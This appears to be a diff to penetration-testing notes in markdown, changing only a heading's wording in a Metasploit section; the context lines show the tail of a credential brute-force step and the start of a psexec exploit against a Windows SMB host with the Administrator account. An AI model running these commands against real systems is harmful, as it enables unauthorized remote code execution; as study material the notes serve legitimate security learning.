@@ -449,7 +449,7 @@ A payload staged can be more stealthy and flexible than a payload non staged, as
  - set VERBOSE false
  - exploit (4 valid credentials) <br>
  <img src="brute.png" width=55% height="auto"><br>
-### Exploit with psexec modules
+### Exploit with psexec module
  - use exploit/windows/smb/psexec
  - set RHOSTS 10.3.23.123
  - set SMBUser Administrator
